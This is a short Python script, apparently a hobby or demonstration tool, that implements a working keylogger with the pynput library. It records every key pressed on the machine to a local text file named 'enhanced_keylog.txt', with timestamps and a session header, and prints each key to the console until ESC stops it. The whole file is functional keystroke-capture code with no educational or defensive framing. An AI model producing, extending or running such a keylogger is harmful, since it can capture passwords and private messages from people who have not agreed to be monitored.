from pynput import keyboard
from datetime import datetime
import logging
import os
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Create log file if not exists
log_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(log_dir, "enhanced_keylog.txt")

# Configure logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s',
    filemode='a'
)

# Header for new session
session_start = f"\n\n{'='*50}\nNew Logging Session - {datetime.now()}\n{'='*50}\n"
logging.info(session_start)
print(Fore.CYAN + session_start)

# Keystroke counter
keystroke_count = 0

def on_press(key):
    global keystroke_count
    try:
        key_info = f"{key.char}"
        logging.info(f"Key Pressed: {key_info}")
        print(Fore.GREEN + f"[+] Key Pressed: {key_info}")
    except AttributeError:
        key_info = f"{key}"
        logging.info(f"[Special] Key Pressed: {key_info}")
        print(Fore.YELLOW + f"[!] Special Key Pressed: {key_info}")

    keystroke_count += 1

def on_release(key):
    if key == keyboard.Key.esc:
        print(Fore.RED + "\n[!] ESC Pressed - Exiting Logger...\n")
        logging.info(f"Logging session ended. Total keys logged: {keystroke_count}")
        return False  # Stop listener

    # Optional: Log key release
    # logging.info(f"Key Released: {key}")

# Run the keylogger listener
def start_keylogger():
    print(Fore.MAGENTA + "🔐 Keylogger is now running. Press [ESC] to stop.\n")
    print(Fore.BLUE + "Logging keys to: " + log_file + "\n")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

start_keylogger()
